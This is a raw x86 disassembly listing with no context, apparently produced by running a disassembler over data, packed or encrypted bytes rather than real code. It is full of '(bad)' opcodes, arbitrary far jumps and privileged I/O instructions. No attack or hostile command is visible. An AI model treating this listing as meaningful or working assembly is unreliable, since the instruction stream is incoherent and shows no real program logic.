  49401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49401f:	and    ecx,DWORD PTR [edi]
  494021:	push   0xdfb4c4bb
  494026:	mov    dl,0xbf
  494028:	mov    al,ds:0xb726b170
  49402d:	xchg   DWORD PTR [ecx+0x277ac055],esp
  494033:	(bad)  
  494034:	and    eax,0xd7562229
  494039:	mov    esi,0x83a4d38
  49403e:	or     al,0xef
  494040:	xor    BYTE PTR [edi+0x48],bl
  494043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494044:	cwde   
  494045:	mov    eax,ds:0x71989af
  49404a:	cmp    DWORD PTR [edi],0x110cf44
  494050:	rcr    BYTE PTR [edx],1
  494052:	push   ds
  494053:	pop    ss
  494054:	inc    edx
  494055:	adc    ecx,ebp
  494057:	pop    edx
  494058:	aas    
  494059:	jge    0xaf554db5
  49405f:	mov    edx,0x213a4510
  494064:	fbstp  TBYTE PTR [edi-0x24fa5d2e]
  49406a:	inc    ecx
  49406b:	addr16 jg 0xddcce4fc
  494072:	pop    edi
  494073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494074:	inc    edi
  494075:	imul   ecx,DWORD PTR [ebp+0x4],0x5859c790
  49407c:	pop    esi
  49407d:	lods   eax,DWORD PTR ds:[esi]
  49407e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49407f:	scas   eax,DWORD PTR es:[edi]
  494080:	inc    ebp
  494081:	mov    cl,0x82
  494083:	xor    eax,0x4737a7e0
  494088:	aam    0xb
  49408a:	xchg   ebp,eax
  49408b:	mov    ah,0x17
  49408d:	outs   dx,DWORD PTR ds:[esi]
  49408e:	inc    esp
  49408f:	jecxz  0x494033
  494091:	js     0x49409a
  494093:	aaa    
  494094:	xor    esi,eax
  494096:	call   0x5a48:0xf76faa10
  49409d:	adc    bl,al
  49409f:	pop    ss
  4940a0:	dec    eax
  4940a1:	jmp    0x4940bc
  4940a3:	mov    ebx,edi
  4940a5:	ja     0x494032
  4940a7:	imul   esp,DWORD PTR [edx-0x28],0xe7425fc7
  4940ae:	pop    eax
  4940af:	pop    ebx
  4940b0:	dec    esp
  4940b1:	add    dl,BYTE PTR [edi]
  4940b3:	ja     0x494120
  4940b5:	inc    ebp
  4940b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4940b7:	or     al,BYTE PTR [esi]
  4940b9:	inc    ebx
  4940ba:	daa    
  4940bb:	adc    eax,0xa7ac4d27
  4940c0:	inc    edi
  4940c1:	push   cs
  4940c2:	fld    TBYTE PTR [edx-0x3e]
  4940c5:	inc    esi
  4940c6:	aaa    
  4940c7:	add    edi,DWORD PTR [edx]
  4940c9:	ins    DWORD PTR es:[edi],dx
  4940ca:	test   DWORD PTR [eax-0x7820582a],esp
  4940d0:	call   0x9631:0xcf8db6a8
  4940d7:	xor    BYTE PTR ds:0x9432af5b,dh
  4940dd:	xor    BYTE PTR [edx],0x9d
  4940e0:	mov    DWORD PTR [ecx-0x21],0x625d0474
  4940e7:	mov    edi,0x56966367
  4940ec:	aaa    
  4940ed:	dec    edi
  4940ee:	iret   
  4940ef:	pop    ebx
  4940f0:	push   edx
  4940f1:	add    BYTE PTR [eax],0x27
  4940f4:	adc    BYTE PTR ds:0x461fb924,0xdf
  4940fb:	sbb    eax,0x4fd28684
  494100:	mov    DWORD PTR [edx+0x27],0x1be849d6
  494107:	aas    
  494108:	adc    DWORD PTR [edi+0x5f6b6a0d],0x3f
  49410f:	scas   al,BYTE PTR es:[edi]
  494110:	mov    ch,0x94
  494112:	push   0x41
  494114:	out    dx,eax
  494115:	outs   dx,DWORD PTR ds:[esi]
  494116:	(bad)  [eax]
  494118:	and    al,0x17
  49411a:	cmp    BYTE PTR [esi],bh
  49411c:	aas    
  49411d:	bound  edi,QWORD PTR [eax-0x1d48e7eb]
  494123:	xlat   BYTE PTR ds:[ebx]
  494124:	ds mov cl,0x36
  494127:	(bad)  
  494128:	xchg   ebx,eax
  494129:	xor    al,0x87
  49412b:	stos   DWORD PTR es:[edi],eax
  49412c:	mov    bh,0x1b
  49412e:	sbb    eax,0xc71e87a6
  494133:	xor    DWORD PTR [edx+edi*4+0x1a872c20],esi
  49413a:	push   0xe5726e5
  49413f:	xor    eax,0x4d4d0b0a
  494144:	fild   QWORD PTR [ebp+edx*2-0x18885ec0]
  49414b:	and    al,0xe
  49414d:	pop    esp
  49414e:	xor    DWORD PTR [edi],eax
  494150:	xor    DWORD PTR [edi],ebx
  494152:	mov    dh,0x16
  494154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  494155:	add    eax,0x5a995177
  49415a:	test   DWORD PTR [edi+0x7],esp
  49415d:	sub    dl,BYTE PTR [ebx+0x2b]
  494160:	jno    0x4941a6
  494162:	or     eax,DWORD PTR [edi]
  494164:	add    al,0x56
  494166:	add    BYTE PTR [edi+edi*1],ah
  494169:	lods   al,BYTE PTR ds:[esi]
  49416a:	or     ch,BYTE PTR [ebx+0x516f5f93]
  494170:	ret    
  494171:	pop    edx
  494172:	or     al,0xa7
  494174:	out    0x42,eax
  494176:	mov    al,ds:0xb733c459
  49417b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49417c:	adc    ah,al
  49417e:	pop    ecx
  49417f:	jg     0x4941f8
  494181:	mov    DWORD PTR [ebx+0x32e7ee00],ecx
  494187:	orps   xmm5,XMMWORD PTR [edx+0x47368032]
  49418e:	(bad)  
  49418f:	sbb    ch,BYTE PTR ds:0x5677a76c
  494195:	jo     0x494142
  494197:	rcl    DWORD PTR [edi],1
  494199:	mov    edi,0xda0221ba
  49419e:	fsubr  DWORD PTR [edi+0x7]
  4941a1:	int    0xda
  4941a3:	pusha  
  4941a4:	adc    dl,BYTE PTR [ebx]
  4941a6:	scas   eax,DWORD PTR es:[edi]
  4941a7:	nop
  4941a8:	mov    ch,0x29
  4941aa:	ins    BYTE PTR es:[edi],dx
  4941ab:	mov    bh,0x3f
  4941ad:	mov    ds:0x376211e8,eax
  4941b2:	ds jg  0x494170
  4941b5:	push   es
  4941b6:	adc    dl,BYTE PTR [edi+edi*2+0x47]
  4941ba:	das    
  4941bb:	imul   ebx,DWORD PTR [edx],0x5fef42a5
  4941c1:	mov    al,ds:0x2f032551
  4941c6:	pop    ebx
  4941c7:	frstor [esi+ecx*4+0x755f2f6b]
  4941ce:	lods   al,BYTE PTR ds:[esi]
  4941cf:	mov    al,ds:0x5b37a702
  4941d4:	jmp    0x49417a
  4941d6:	test   bh,bh
  4941d8:	add    BYTE PTR [ecx-0x3b],0x46
  4941dc:	xlat   BYTE PTR ds:[ebx]
  4941dd:	daa    
  4941de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4941df:	push   es
  4941e0:	pop    ss
  4941e1:	mov    al,0x64
  4941e3:	cmp    DWORD PTR [edi-0x68],eax
  4941e6:	cmp    al,0x52
  4941e8:	sub    dl,BYTE PTR [edi]
  4941ea:	pop    ds
  4941eb:	inc    ecx
  4941ec:	mov    al,0x42
  4941ee:	fsub   st(2),st
  4941f0:	xlat   BYTE PTR ds:[ebx]
  4941f1:	inc    edx
  4941f2:	xlat   BYTE PTR ds:[ebx]
  4941f3:	rcl    DWORD PTR [edx],0x42
  4941f6:	xor    eax,0xa614e5f
  4941fb:	mov    ecx,0xf333147
  494200:	xor    al,0x22
  494202:	sbb    BYTE PTR [ecx],ch
  494204:	inc    edi
  494205:	mov    cl,0x16
  494207:	pusha  
  494208:	pop    ss
  494209:	outs   dx,DWORD PTR ds:[esi]
  49420a:	add    eax,DWORD PTR [edi+0x3]
  49420d:	lods   eax,DWORD PTR ds:[esi]
  49420e:	dec    ecx
  49420f:	dec    ebx
  494210:	out    dx,al
  494211:	xor    eax,0x48563c4f
  494216:	pusha  
  494217:	inc    edi
  494218:	daa    
  494219:	adc    BYTE PTR [edx+ebx*2],0xbb
  49421d:	aas    
  49421e:	scas   eax,DWORD PTR es:[edi]
  49421f:	out    0x76,eax
  494221:	jmp    0x92a0f2b6
  494226:	outs   dx,DWORD PTR ds:[esi]
  494227:	push   0x5fc21015
  49422c:	fs dec edx
  49422e:	mov    esi,0x31438660
  494233:	adc    BYTE PTR [ebx],ch
  494235:	inc    esp
  494236:	or     dh,BYTE PTR [edi+0xa]
  494239:	and    bl,ah
  49423b:	jbe    0x494264
  49423d:	jle    0x49422e
  49423f:	or     BYTE PTR [ecx],dl
  494241:	inc    ecx
  494242:	ret    0x6a77
  494245:	bound  esi,QWORD PTR [eax+edx*8-0x29502dc9]
  49424c:	add    DWORD PTR [eax],edx
  49424e:	add    edi,0x80555bd0
  494254:	daa    
  494255:	xlat   BYTE PTR ds:[ebx]
  494256:	bound  edx,QWORD PTR [eax+eax*4]
  494259:	add    eax,0x12b46fff
  49425e:	sub    eax,DWORD PTR [esi+0x27]
  494261:	addr16 add cl,0xa2
  494265:	nop
  494266:	pop    edi
  494267:	jle    0x494239
  494269:	and    al,0x61
  49426b:	mov    ds:0xa4354ff3,eax
  494270:	inc    ecx
  494271:	test   al,0xa7
  494273:	outs   dx,DWORD PTR ds:[esi]
  494274:	frstor [eax]
  494276:	mov    al,ds:0x5d6ef06
  49427b:	inc    edx
  49427c:	xor    ecx,DWORD PTR ds:0x7d4e0f2f
  494282:	and    al,0x58
  494284:	stos   DWORD PTR es:[edi],eax
  494285:	(bad)  
  494286:	pop    ss
  494287:	dec    ebp
  494288:	sbb    eax,0xcb96a5d1
  49428d:	inc    ebx
  49428e:	or     ch,BYTE PTR [eax+ebx*4]
  494291:	cmp    dh,BYTE PTR [edi+0x29874746]
  494297:	sub    al,0x36
  494299:	mov    al,0x97
  49429b:	mov    DWORD PTR [ebp-0x2060dca8],eax
  4942a1:	mov    dh,0x61
  4942a3:	lds    ebx,FWORD PTR [edx-0x70d83891]
  4942a9:	jnp    0x4942f2
  4942ab:	mov    ds:0xff43f794,eax
  4942b0:	(bad)  
  4942b1:	or     al,al
  4942b3:	sbb    al,BYTE PTR [edx]
  4942b5:	pop    ss
  4942b6:	jne    0x4942f8
  4942b8:	xor    DWORD PTR [edi+edi*4],0x312f4557
  4942bf:	adc    BYTE PTR [ebx],ch
  4942c1:	outs   dx,DWORD PTR ds:[esi]
  4942c2:	xlat   BYTE PTR ds:[ebx]
  4942c3:	mov    ebx,0x6ea6e95d
  4942c8:	xchg   DWORD PTR [ecx],esi
  4942ca:	(bad)  
  4942cb:	aas    
  4942cc:	push   ss
  4942cd:	sbb    eax,0xde676d87
  4942d2:	(bad)  
  4942d4:	add    eax,0xb783008f
  4942d9:	iret   
  4942da:	xor    BYTE PTR [ecx-0x50],bh
  4942dd:	pusha  
  4942de:	outs   dx,DWORD PTR ds:[esi]
  4942df:	iret   
  4942e0:	inc    edx
  4942e1:	stos   BYTE PTR es:[edi],al
  4942e2:	sbb    ah,al
  4942e4:	and    al,0xd7
  4942e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4942e7:	push   esi
  4942e8:	or     bl,BYTE PTR [edx+0x47]
  4942eb:	pop    ds
  4942ec:	pop    ss
  4942ed:	dec    esi
  4942ee:	scas   al,BYTE PTR es:[edi]
  4942ef:	(bad)  
  4942f0:	fcomi  st,st(3)
  4942f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4942f3:	scas   eax,DWORD PTR es:[edi]
  4942f4:	inc    esi
  4942f5:	inc    edx
  4942f6:	and    BYTE PTR [ecx],dh
  4942f8:	inc    ecx
  4942f9:	hlt    
  4942fa:	aaa    
  4942fb:	pop    ss
  4942fc:	inc    ebx
  4942fd:	push   ebp
  4942fe:	inc    ecx
  4942ff:	dec    eax
  494300:	int    0x67
  494302:	inc    edi
  494303:	nop
  494304:	push   esi
  494305:	aaa    
  494306:	lods   eax,DWORD PTR ds:[esi]
  494307:	pop    edi
  494308:	ret    0x1ba4
  49430b:	pop    esp
  49430c:	pop    es
  49430d:	div    DWORD PTR [eax]
  49430f:	jb     0x494325
  494311:	dec    ecx
  494312:	cmp    cl,BYTE PTR [edi+0x1f]
  494315:	inc    ecx
  494316:	push   es
  494317:	call   0x8c50:0x32ef6044
  49431e:	dec    ebx
  49431f:	xchg   ecx,eax
  494320:	pop    edi
  494321:	ds mov edi,0x88724aa9
  494327:	push   ss
  494328:	xor    esi,DWORD PTR [edi]
  49432a:	test   dh,dl
  49432c:	pusha  
  49432d:	add    esp,edi
  49432f:	mov    bh,0xe9
  494331:	pop    eax
  494332:	les    ebp,FWORD PTR [edi]
  494334:	aaa    
  494335:	inc    ebx
  494336:	pop    ss
  494337:	cmp    DWORD PTR [ebx+ebx*2],ecx
  49433a:	xchg   DWORD PTR [esi],esp
  49433c:	ja     0x49436d
  49433e:	cmp    BYTE PTR [edx+0x34976b90],bh
  494344:	pop    edi
  494345:	xor    al,0x39
  494347:	sub    edx,DWORD PTR gs:[ecx]
  49434a:	sbb    DWORD PTR [edi-0x7f],esi
  49434d:	shl    DWORD PTR [ecx-0x30],1
  494350:	test   DWORD PTR [ecx-0x39],0xd8cd69d0
  494357:	lahf   
  494358:	xchg   edi,eax
  494359:	push   cs
  49435a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49435b:	push   cs
  49435c:	test   eax,0x3777678b
  494361:	mov    al,0x10
  494363:	sub    edx,DWORD PTR [esi-0x79]
  494366:	(bad)  
  494367:	daa    
  494368:	mov    DWORD PTR [ebx-0x80],ebp
  49436b:	ror    BYTE PTR [edi],cl
  49436d:	pop    edi
  49436e:	inc    ecx
  49436f:	rcr    BYTE PTR [edx+0x5],cl
  494372:	(bad)  
  494374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494375:	(bad)  
  494376:	mov    dh,BYTE PTR [ebp+0xfafd7b6]
  49437c:	push   ds
  49437d:	push   esi
  49437e:	mov    cl,0x68
  494380:	mov    bh,0xcf
  494382:	rcr    DWORD PTR [edx],cl
  494384:	or     DWORD PTR [eax-0x6b],esp
  494387:	mul    edi
  494389:	pop    edx
  49438a:	(bad)  
  49438b:	lds    edi,FWORD PTR [edx+0x33172330]
  494391:	inc    ebp
  494392:	(bad)  
  494393:	adc    al,0x47
  494395:	inc    ecx
  494396:	mov    bh,0x38
  494398:	add    BYTE PTR [esi],dl
  49439a:	add    esp,DWORD PTR [ecx]
  49439c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49439d:	rol    bh,1
  49439f:	add    ch,BYTE PTR [ebp+0x58a74707]
  4943a5:	scas   al,BYTE PTR es:[edi]
  4943a6:	pusha  
  4943a7:	xchg   ebp,eax
  4943a8:	lahf   
  4943a9:	xchg   edi,eax
  4943aa:	aaa    
  4943ab:	imul   eax,DWORD PTR [ebx],0x26
  4943ae:	sbb    ecx,DWORD PTR [edi]
  4943b0:	inc    edi
  4943b1:	add    dl,BYTE PTR [edx+0x1]
  4943b4:	add    BYTE PTR [esi+0x30],ch
  4943b7:	push   cs
  4943b8:	add    bl,bl
  4943ba:	sbb    al,bh
  4943bc:	aaa    
  4943bd:	xchg   DWORD PTR [eax-0x7b],ecx
  4943c0:	inc    eax
  4943c1:	scas   al,BYTE PTR es:[edi]
  4943c2:	inc    esi
  4943c3:	scas   al,BYTE PTR es:[edi]
  4943c4:	shl    BYTE PTR [eax],0x56
  4943c7:	fild   WORD PTR [bp+di-0x66]
  4943cb:	or     edx,DWORD PTR [eax+ecx*2-0x6fccce11]
  4943d2:	or     cl,BYTE PTR [esp+ecx*2+0x27]
  4943d6:	push   ss
  4943d7:	sbb    cl,BYTE PTR [ecx]
  4943d9:	call   0x48c13b54
  4943de:	adc    eax,0x6a47b0b0
  4943e3:	in     eax,dx
  4943e4:	inc    esp
  4943e5:	sub    al,BYTE PTR [edi+0x5f]
  4943e8:	das    
  4943e9:	adc    ecx,DWORD PTR [ebp+0x2b392ef7]
  4943ef:	das    
  4943f0:	into   
  4943f1:	mov    edi,eax
  4943f3:	ss dec ecx
  4943f5:	cmp    DWORD PTR [ebx],esi
  4943f7:	dec    ebx
  4943f8:	push   ss
  4943f9:	dec    esp
  4943fa:	and    dl,BYTE PTR [edx+edi*4+0x56b0cfa7]
  494401:	xor    edx,DWORD PTR [esi]
  494403:	scas   eax,DWORD PTR es:[edi]
  494404:	(bad)  
  494405:	sbb    ah,BYTE PTR fs:[ebx-0x41]
  494409:	dec    edi
  49440a:	add    ch,al
  49440c:	sub    cl,BYTE PTR fs:[edi+0x10544736]
  494413:	fmul   st,st(6)
  494415:	xor    DWORD PTR [edi],esi
  494417:	xchg   DWORD PTR [eax+0x75],ebp
  49441a:	or     cl,BYTE PTR [eax]
  49441c:	neg    eax
  49441e:	sbb    BYTE PTR [eax+0x356f2736],cl
  494424:	push   esi
  494425:	dec    ecx
  494426:	sub    DWORD PTR [edx-0x19],eax
  494429:	div    DWORD PTR [esi]
  49442b:	add    ebp,DWORD PTR [ebx]
  49442d:	jmp    0x44a4:0xf70737d3
  494434:	rol    DWORD PTR [ecx+0x706bb70f],1
  49443a:	dec    ecx
  49443b:	mov    ebx,0xa169e76f
  494440:	xor    eax,0x466b0f42
  494445:	adc    BYTE PTR [ebx],ch
  494447:	cdq    
  494448:	scas   eax,DWORD PTR es:[edi]
  494449:	inc    esi
  49444a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49444b:	mov    ch,0x68
  49444d:	cmp    BYTE PTR [ebx+esi*1],cl
  494450:	mov    es,WORD PTR [esi-0x36]
  494453:	pop    eax
  494454:	leave  
  494455:	ss mov bh,0x89
  494458:	jne    0x4944ab
  49445a:	mov    DWORD PTR [edi+0x6b],ebx
  49445d:	xchg   ebp,eax
  49445e:	mov    ch,dl
  494460:	(bad)  
  494461:	jnp    0x49444e
  494463:	xor    BYTE PTR [ebp-0x7d60088b],al
  494469:	push   esi
  49446a:	mov    ch,0x66
  49446c:	push   DWORD PTR [edi+ebp*1]
  49446f:	add    BYTE PTR [edi+0x53bf9523],dl
  494475:	mov    dl,0x85
  494477:	les    edx,FWORD PTR ds:0x42bf9f3c
  49447d:	ja     0x49445b
  49447f:	jbe    0x49440d
  494481:	imul   edx,DWORD PTR [edi+0xa451f17],0x5c
  494488:	xlat   BYTE PTR ds:[ebx]
  494489:	test   DWORD PTR [ecx],edi
  49448b:	xlat   BYTE PTR ds:[ebx]
  49448c:	inc    ebp
  49448d:	jg     0x494469
  49448f:	push   ebx
  494490:	sbb    DWORD PTR es:[ecx],esi
  494493:	xor    edi,esp
  494495:	inc    edi
  494496:	sar    BYTE PTR [eax],cl
  494498:	test   ch,ah
  49449a:	xor    al,0x4f
  49449c:	les    ebp,FWORD PTR [edx]
  49449e:	mov    BYTE PTR ds:0x1d614753,dl
  4944a4:	mov    ecx,DWORD PTR [eax+0x6f]
  4944a7:	(bad)  
  4944a8:	dec    ecx
  4944a9:	mov    eax,0xcf1be311
  4944ae:	dec    esi
  4944af:	mov    ds:0x372a9560,eax
  4944b4:	push   cs
  4944b5:	daa    
  4944b6:	pop    eax
  4944b7:	push   ebp
  4944b8:	add    eax,DWORD PTR [edi+ebx*2]
  4944bb:	inc    esi
  4944bc:	aaa    
  4944bd:	push   esp
  4944be:	sbb    ebp,DWORD PTR [ebx+0x7f371b72]
  4944c4:	rol    BYTE PTR [ebx-0x60bc37be],1
  4944ca:	adc    al,0xb0
  4944cc:	inc    esi
  4944cd:	add    al,0x7f
  4944cf:	out    dx,eax
  4944d0:	pop    edx
  4944d1:	jno    0x494454
  4944d3:	pop    edx
  4944d4:	ja     0x49446a
  4944d6:	mov    ds:0x270f1835,al
  4944db:	jne    0x4944b6
  4944dd:	shr    BYTE PTR [eax+0x2a311f7f],0x5
  4944e4:	imul   edx,DWORD PTR [edi],0xb6840234
  4944ea:	mov    edi,0xe9084012
  4944ef:	fidiv  WORD PTR [eax]
  4944f1:	add    DWORD PTR [eax+edx*1+0x44870fab],ebp
  4944f8:	and    DWORD PTR ds:0x146078f,esp
  4944fe:	xor    DWORD PTR [ecx+0xf73fd5],ebp
  494504:	pop    ebp
  494505:	adc    edx,ecx
  494507:	xor    cl,bh
  494509:	adc    al,0xd2
  49450b:	mov    edx,0x2f343708
  494510:	lods   al,BYTE PTR ds:[esi]
  494511:	dec    eax
  494512:	dec    eax
  494513:	enter  0xdf30,0xa
  494517:	push   es
  494518:	cmp    ecx,DWORD PTR [ecx-0x69]
  49451b:	jmp    0x494500
  49451d:	inc    eax
  49451e:	stos   DWORD PTR es:[edi],eax
  49451f:	dec    esi
  494520:	ffreep st(6)
  494522:	xor    eax,0x62a98da4
  494527:	outs   dx,DWORD PTR ds:[esi]
  494528:	inc    ebx
  494529:	inc    esi
  49452a:	ins    BYTE PTR es:[edi],dx
  49452b:	imul   ebp,DWORD PTR [ebx-0x7070e8c1],0x6a
  494532:	push   0x5
  494534:	mov    al,0x17
  494536:	mul    DWORD PTR ds:0x4eb12255
  49453c:	xor    al,0x23
  49453e:	mov    al,0xcc
  494540:	cmp    BYTE PTR [ebx],0x35
  494543:	mov    bh,0xae
  494545:	in     eax,dx
  494546:	(bad)  
  494547:	adc    al,0x41
  494549:	mov    DWORD PTR [edi+0x39],0x40412b7
  494550:	aaa    
  494551:	aaa    
  494552:	pop    esp
  494553:	sbb    eax,0x479a56ac
  494558:	out    0xd0,eax
  49455a:	dec    eax
  49455b:	xchg   ebp,eax
  49455c:	ins    DWORD PTR es:[edi],dx
  49455d:	out    0xe,eax
  49455f:	push   ds
  494560:	loopne 0x4945b8
  494562:	mov    edi,0x65a7373f
  494567:	or     BYTE PTR [ebp+0x16],al
  49456a:	iret   
  49456b:	(bad)  
  49456c:	mov    esp,0x3b369b0d
  494571:	outs   dx,DWORD PTR ds:[esi]
  494572:	pop    ss
  494573:	das    
  494574:	and    ebx,esi
  494576:	mov    BYTE PTR [edi+eiz*1],cl
  494579:	mov    bh,0x8f
  49457b:	add    DWORD PTR [eax+eiz*8+0x9082758],ecx
  494582:	loopne 0x49451c
  494584:	xchg   edi,eax
  494585:	inc    ecx
  494586:	test   DWORD PTR [eax],0x32869b0a
  49458c:	out    dx,eax
  49458d:	mov    bh,0xde
  49458f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494590:	lds    esi,FWORD PTR [edi+0xb3743c7]
  494596:	aam    0xc0
  494598:	push   ss
  494599:	pop    edi
  49459a:	cmp    BYTE PTR [ebp+esi*1+0x17bfadad],cl
  4945a1:	test   DWORD PTR [ecx-0x39],0xc3c7f021
  4945a8:	daa    
  4945a9:	popa   
  4945aa:	aad    0x1a
  4945ac:	jb     0x4945e3
  4945ae:	das    
  4945af:	es inc ebx
  4945b1:	stos   DWORD PTR es:[edi],eax
  4945b2:	or     BYTE PTR [edi],cl
  4945b4:	pop    edi
  4945b5:	adc    eax,0xef2c4813
  4945ba:	mov    ah,0x56
  4945bd:	sar    DWORD PTR [eax],1
  4945bf:	push   edi
  4945c0:	jg     0x4945f8
  4945c2:	dec    edx
  4945c3:	or     dl,BYTE PTR [ebx+eax*8-0x69]
  4945c7:	sar    BYTE PTR [edx],0xb0
  4945ca:	bound  esi,QWORD PTR [edi-0x546de921]
  4945d0:	fldcw  WORD PTR [edi+0x46]
  4945d3:	(bad)
  4945d7:	xchg   edi,eax
  4945d8:	mov    bh,0x27
  4945da:	xchg   BYTE PTR [ebp+0xd],ch
  4945dd:	rcr    BYTE PTR [edi+0x7],1
  4945e0:	daa    
  4945e1:	add    BYTE PTR [ebx+0x5a],ch
  4945e4:	rcr    edi,0x2f
  4945e7:	mov    al,ds:0x8fab5441
  4945ec:	dec    edi
  4945ed:	inc    edx
  4945ee:	and    eax,0x349f9ae4
  4945f3:	dec    edi
  4945f4:	ret    0x2855
  4945f7:	rcl    BYTE PTR [edi+0x5520ad07],0x4a
  4945fe:	pop    ds
  4945ff:	mov    edi,0xe3896b0a
  494604:	inc    ebx
  494605:	scas   eax,DWORD PTR es:[edi]
  494606:	add    eax,DWORD PTR [edi+0x7f2552b2]
  49460c:	xlat   BYTE PTR ds:[ebx]
  49460d:	nop
  49460e:	rcl    BYTE PTR [eax+edx*4+0x4dacf35],cl
  494615:	lods   al,BYTE PTR ds:[esi]
  494616:	adc    DWORD PTR [edi],edx
  494618:	mov    edi,0x4166ae36
  49461d:	dec    edi
  49461e:	xor    eax,0x42a247c1
  494623:	pop    es
  494624:	adc    ebx,DWORD PTR [edi]
  494626:	pusha  
  494627:	xor    DWORD PTR [ecx+0x58],edx
  49462a:	out    dx,eax
  49462b:	xor    eax,0x874dd560
  494630:	push   edi
  494631:	sub    DWORD PTR [eax],ebx
  494633:	xchg   ecx,eax
  494634:	mov    DWORD PTR [edi+0x156e9307],edi
  49463a:	or     DWORD PTR [edi],ecx
  49463c:	(bad)  
  49463d:	xor    eax,0x10b60648
  494642:	inc    edi
  494643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494644:	inc    ebx
  494645:	repnz add ebx,eax
  494648:	aad    0x1f
  49464a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49464b:	inc    esp
  49464c:	add    BYTE PTR [esi],dh
  49464e:	inc    edx
  49464f:	xchg   BYTE PTR [esi+0x26303f11],ch
  494655:	inc    ebx
  494656:	nop
  494657:	ss das 
  494659:	dec    edi
  49465a:	cmp    DWORD PTR ds:0xb78622c4,ecx
  494660:	pop    edi
  494661:	aam    0x5a
  494663:	add    ebp,DWORD PTR [esi+0x4e]
  494666:	out    0x5f,eax
  494668:	inc    eax
  494669:	cmp    dh,BYTE PTR [eax]
  49466b:	dec    edx
  49466c:	loop   0x4946cd
  49466e:	add    dl,BYTE PTR [eax-0x57]
  494671:	fild   DWORD PTR [edi-0x32]
  494674:	cmp    ah,BYTE PTR [ecx-0x7b]
  494677:	xchg   edx,eax
  494678:	xor    ebx,DWORD PTR [edi]
  49467a:	dec    eax
  49467b:	sbb    dl,BYTE PTR [edx+0x35d7323a]
  494681:	push   ebp
  494682:	or     eax,DWORD PTR [esi+0x6c]
  494685:	xor    al,bh
  494687:	pop    es
  494688:	mov    bh,0x3
  49468a:	or     al,dh
  49468c:	sbb    eax,0x77447f32
  494691:	push   ecx
  494692:	add    dl,BYTE PTR [esi+0x43]
  494695:	aas    
  494696:	popa   
  494697:	sbb    al,0xd2
  494699:	mov    bl,BYTE PTR [edi-0x21]
  49469c:	(bad)  
  49469d:	test   al,0x41
  49469f:	inc    ebp
  4946a0:	out    0x7,eax
  4946a2:	add    al,0xbb
  4946a4:	push   es
  4946a5:	test   al,0xf7
  4946a7:	xor    cl,bl
  4946a9:	punpckhdq mm4,QWORD PTR [ecx]
  4946ac:	xchg   edi,eax
  4946ad:	or     al,0x30
  4946af:	xor    al,0x11
  4946b1:	pusha  
  4946b2:	inc    edi
  4946b3:	mov    BYTE PTR [edi],bh
  4946b5:	pop    es
  4946b6:	mov    bh,0x81
  4946b8:	jne    0x4946fd
  4946ba:	sbb    al,BYTE PTR [edi-0x2e]
  4946bd:	(bad)  
  4946be:	ror    BYTE PTR [edx+0x4a40e737],0x8b
  4946c5:	shl    BYTE PTR [edi],cl
  4946c7:	daa    
  4946c8:	pop    ecx
  4946c9:	sub    ebx,DWORD PTR [eax-0x59]
  4946cc:	aas    
  4946cd:	lds    ecx,FWORD PTR [bx+si+0x4814]
  4946d2:	xor    ecx,DWORD PTR [edi-0x553dbaa8]
  4946d8:	xlat   BYTE PTR ds:[ebx]
  4946d9:	sub    edx,DWORD PTR [si+0x61]
  4946dd:	dec    ebp
  4946de:	daa    
  4946df:	lahf   
  4946e0:	push   ds
  4946e1:	dec    ecx
  4946e2:	scas   al,BYTE PTR es:[edi]
  4946e3:	bound  edi,QWORD PTR [edi-0xf7fd0bd]
  4946e9:	rcl    BYTE PTR [edx-0x15bd45bd],0x58
  4946f0:	inc    esp
  4946f1:	mov    edi,0x6b67a1f
  4946f6:	test   BYTE PTR [edi-0x21],dl
  4946f9:	lea    edx,ds:0xe7bf6842
  4946ff:	pop    ds
  494700:	mov    al,ds:0xff0f0506
  494705:	adc    eax,0x339210b0
  49470a:	out    0x8b,eax
  49470c:	jne    0x4946a8
  49470e:	pop    edx
  49470f:	(bad)  
  494710:	push   cs
  494711:	imul   edx,DWORD PTR ds:0x7777035d,0x5a
  494718:	push   esp
  494719:	loope  0x4946c8
  49471b:	ud0    ecx,edi
  49471e:	inc    ecx
  49471f:	jne    0x494751
  494721:	xchg   ecx,eax
  494722:	mov    edi,0x26958f45
  494727:	mov    al,0x82
  494729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49472a:	dec    edi
  49472b:	outs   dx,BYTE PTR ds:[esi]
  49472c:	add    DWORD PTR [edi+0x5fa61f8e],esi
  494732:	stc    
  494733:	cs push eax
  494735:	sub    DWORD PTR [edi],ebp
  494737:	cmp    DWORD PTR [eax],eax
  494739:	xor    al,0x7c
  49473b:	pop    eax
  49473c:	inc    esp
  49473d:	and    BYTE PTR [ebx+0x2],bl
  494740:	ror    BYTE PTR [edx],0x44
  494743:	jg     0x49470a
  494745:	dec    eax
  494746:	popa   
  494747:	push   eax
  494748:	push   DWORD PTR [edi-0x77a9edde]
  49474e:	xchg   DWORD PTR [edi-0x48b17ca6],eax
  494754:	daa    
  494755:	xor    dl,bh
  494757:	xor    cl,0x74
  49475a:	pop    ebp
  49475b:	scas   eax,DWORD PTR es:[edi]
  49475c:	cmp    DWORD PTR [edi],eax
  49475e:	scas   al,BYTE PTR es:[edi]
  49475f:	fistp  DWORD PTR [ebx+0x14]
  494762:	iret   
  494763:	pop    ss
  494764:	repz xor edi,edi
  494767:	loopne 0x4947c9
  494769:	push   ebp
  49476a:	xor    DWORD PTR [edi],0xffffff87
  49476d:	and    al,BYTE PTR [ecx]
